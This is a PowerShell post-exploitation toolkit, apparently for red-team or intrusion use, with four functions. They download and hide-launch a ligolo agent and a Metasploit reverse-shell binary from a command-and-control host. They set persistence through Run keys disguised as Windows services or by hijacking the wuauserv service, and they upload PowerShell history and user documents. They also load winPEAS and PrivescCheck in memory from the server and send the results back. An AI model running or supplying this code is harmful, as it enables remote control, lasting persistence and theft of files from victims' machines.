function Invoke-Callback {
    param(
        [Parameter(Mandatory=$true)]
        [string]$C2
    )

    # ----------------------------------------
    # Prepare storage folder
    # ----------------------------------------
    $tmp = Join-Path $env:TEMP ("syscache_" + [guid]::NewGuid().ToString())
    if (!(Test-Path $tmp)) { New-Item -ItemType Directory -Path $tmp -Force | Out-Null }

    # Paths for binaries
    $agentPath = Join-Path $tmp "agent.exe"
    $revShellPath = Join-Path $tmp "reverse.exe"

    # ----------------------------------------
    # Download & launch agent.exe (ligolo)
    # ----------------------------------------
    Invoke-WebRequest "http://$C2/payloads/agent.exe" -OutFile $agentPath
    Start-Process $agentPath -WindowStyle Hidden

    # ----------------------------------------
    # Download & launch reverse.exe (Msf rev tcp)
    # ----------------------------------------
    Invoke-WebRequest "http://$C2/payloads/reverse.exe" -OutFile $revShellPath
    Start-Process $revShellPath -WindowStyle Hidden

    # ----------------------------------------
    # Detect privilege level
    # ----------------------------------------
    
    # Default assumption
    $privilegeLevel = "User"

    # Check if running as local admin
    $identity  = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($identity)

    if ($principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
        $privilegeLevel = "LocalAdmin"
    }

    # Try domain lookup
    try {
        $domain = ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).Name
        $currentUser = $identity.Name.Split('\')[-1]  # just username

        # Build LDAP path for "Domain Admins"
        $ldapPath = "LDAP://CN=Domain Admins,CN=Users,DC=" + ($domain -replace '\.', ',DC=')
        $searcher = New-Object DirectoryServices.DirectorySearcher([ADSI]$ldapPath)

        $domainAdmins = $searcher.FindAll() | ForEach-Object {
            $_.Properties.samaccountname
        }

        if ($domainAdmins -contains $currentUser) {
            $privilegeLevel = "DomainAdmin"
        }
    }
    catch {
        # Not domain joined or no AD access
    }

    # ----------------------------------------
    # Conditional persistence
    # ----------------------------------------
    if ($privilegeLevel -eq "User") {
        # Run-key persistence
        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Windows Update Agent" -Value $agentPath
        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Windows Reverse Lookup Service" -Value $revShellPath
    }
    else {
        # Modify wuauserv to launch both binaries
        $svc = Get-WmiObject -Class Win32_Service -Filter "Name='wuauserv'"
        if ($svc) {
            $currentPath = $svc.PathName.Trim('"')
            $newPath = "$currentPath & `"$agentPath`" & `"$revShellPath`""
            $svc.Change($null,$null,$null,$null,$null,$null,$newPath,$null)
            Start-Service wuauserv
        }
    }
}

function Invoke-Collection {
    param(
        [Parameter(Mandatory=$true)]
        [string]$C2
    )
    # ----------------------------------------
    # Collect and exfiltrate PowerShell history
    # ----------------------------------------

    $histPath = $null
    $cmd = Get-Command Get-PSReadlineOption -ErrorAction SilentlyContinue
    if ($cmd) {
        try { $histPath = (Get-PSReadlineOption).HistorySavePath } catch { }
    }
    if (-not $histPath) {
        $histPath = Join-Path $env:APPDATA "Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"
    }

    if ($histPath -and (Test-Path $histPath)) {
        try {
            $psHist = Get-Content -Path $histPath -ErrorAction SilentlyContinue
            if ($psHist) {
                Invoke-FileUpload -C2 $C2 -InputString $psHist -Filename "ConsoleHost_history_$($env:COMPUTERNAME)_$($env:USERNAME).txt" | Out-Null
            }
        } catch { }
    }

    # ----------------------------------------
    # Collect user files and exfiltrate
    # ----------------------------------------
    $extensions = '*.txt','*.pdf','*.xls','*.xlsx','*.doc','*.docx','*.ini'
    try {
        $files = Get-ChildItem -Path "C:\Users\" -Include $extensions -File -Recurse -ErrorAction SilentlyContinue
        foreach ($file in $files) {
            try {
                Invoke-FileUpload -C2 $C2 -FilePath $file | Out-Null
            } catch {
                Write-Host "Upload failed for: $($file.FullName)" -ForegroundColor Red
            }
        }
    } catch {
        Write-Host "Error while enumerating files: $_" -ForegroundColor Yellow
    }
}


function Invoke-PrivEsc {
    param(
        [Parameter(Mandatory=$true)]
        [string]$C2
    )

    # ----------------------------------------
    # Stealthy temp folder
    # ----------------------------------------
    $tmp = Join-Path $env:TEMP ("syscache_" + [guid]::NewGuid().ToString())
    New-Item -ItemType Directory -Path $tmp -Force | Out-Null

    # ----------------------------------------
    # Collect and POST systeminfo (for wes-ng)
    # ----------------------------------------
    $sysInfo = systeminfo | Out-String
    Invoke-FileUpload -C2 $C2 -InputString $sysInfo -Filename "systeminfo_$($env:COMPUTERNAME)_$($env:USERNAME).txt" | Out-Null

    # ----------------------------------------
    # Run winPEAS.exe in memory and exfiltrate output
    # ----------------------------------------
    $peasUrl = "http://$C2/winpeas.exe"
    $wp = [System.Reflection.Assembly]::Load(
        [byte[]](Invoke-WebRequest $peasUrl -UseBasicParsing | Select-Object -ExpandProperty Content)
    )

    # Redirect stdout to a StringWriter
    $sw = New-Object System.IO.StringWriter
    [Console]::SetOut($sw)

    # Execute winPEAS
    [winPEAS.Program]::Main(@(""))

    # Capture the output
    $peasOutput = $sw.ToString()

    # Restore console output
    [Console]::SetOut([System.IO.StreamWriter]::new([Console]::OpenStandardOutput()))

    Invoke-FileUpload -C2 $C2 -InputString $peasOutput -Filename "winpeas_$($env:COMPUTERNAME)_$($env:USERNAME).txt" | Out-Null

    # ----------------------------------------
    # Run PrivescCheck.ps1 in-memory → POST separately
    # ----------------------------------------
    $privCheck = (New-Object Net.WebClient).DownloadString("http://$($C2)/PrivescCheck.ps1")
    Invoke-Expression $privCheck
    $privCheckHtml = Join-Path $tmp "PrivescCheck_$($env:COMPUTERNAME)"
    $privCheckOutput = Invoke-PrivescCheck -Extended -Report $privCheckHtml -Format HTML | Out-String
    Invoke-FileUpload -C2 $C2 -InputString $privCheckOutput -FileName "PrivescCheck_$($env:COMPUTERNAME)_$($env:USERNAME).txt" | Out-Null
    Invoke-FileUpload -C2 $C2 -FilePath "$privCheckHtml.html" | Out-Null

    # ----------------------------------------
    # Cleanup
    # ----------------------------------------
    Remove-Item $privCheckHtml -Force
}


function Invoke-FileUpload {
    param(
        [Parameter(ParameterSetName="File", Mandatory=$true)]
        [string]$FilePath,

        [Parameter(ParameterSetName="Direct", Mandatory=$true)]
        [string]$InputString,

        [Parameter(ParameterSetName="Direct", Mandatory=$true)]
        [string]$FileName,

        [Parameter(Mandatory=$true)]
        [string]$C2
    )

    try {
        # Construct upload URL
        $Url = "http://$($C2):8080/p"
        $Boundary = [System.Guid]::NewGuid().ToString()
        $LF = "`r`n"

        if ($PSCmdlet.ParameterSetName -eq "File") {
            if (-not (Test-Path $FilePath)) {
                Write-Error "File not found: $FilePath"
                return
            }
            $FileName = [System.IO.Path]::GetFileName($FilePath)
            $FileContent = Get-Content -Raw -Path $FilePath
        }
        else {
            $FileContent = $InputString
        }

        # Build multipart body manually
        $Body  = "--$Boundary$LF"
        $Body += "Content-Disposition: form-data; name=`"file`"; filename=`"$FileName`"$LF"
        $Body += "Content-Type: text/plain$LF$LF"
        $Body += $FileContent + $LF
        $Body += "--$Boundary--$LF"

        # Send request
        Invoke-WebRequest -Uri $Url -Method Post -Body $Body -ContentType "multipart/form-data; boundary=$Boundary" -UseBasicParsing

        Write-Host "[*] Uploaded $FileName to $Url"
    }
    catch {
        Write-Error "Upload failed: $_"
    }
}
